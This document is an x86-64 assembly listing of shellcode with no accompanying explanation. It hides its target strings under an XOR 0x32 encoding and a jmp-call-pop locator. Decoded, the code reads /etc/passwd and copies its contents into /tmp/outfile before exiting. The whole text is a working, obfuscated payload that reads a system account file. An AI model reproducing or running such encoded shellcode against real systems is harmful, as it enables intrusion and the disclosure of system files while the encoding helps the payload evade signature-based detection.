section .text
global _start
 
_start:
        xor rsi, rsi
        jmp string_1
cont_1:
        pop rdi
        push 24
        pop rcx
decode:
        xor byte [rdi+rcx], 0x32
        loop decode
        sub byte [rdi+11], 0x41         
        sub byte [rdi+24], 0x41         
        push 2
        pop rax
        syscall
        push rax
        pop r14           
        add rdi, 12
        push 0x66
        pop rsi
        push 2
        pop rax
        syscall
        push rax
        pop r15             
        xor rax, rax
        push r14
        pop rdi
        push rsp
        pop rsi
        mov dx, 0xFFFF
        syscall
        push rax
        pop rdx
        push r15
        pop rdi
        push 1
        pop rax
        syscall
        push 60
        pop rax
        syscall
 
string_1:
    call cont_1
    s_1: db 0x2F, 0x57, 0x46, 0x51, 0x1D, 0x42, 0x53, 0x41, 0x41, 0x45, 0x56, 0x73, 0x1D, 0x46, 0x5F, 0x42, 0x1D, 0x5D, 0x47, 0x46, 0x54, 0x5B, 0x5E, 0x57, 0x73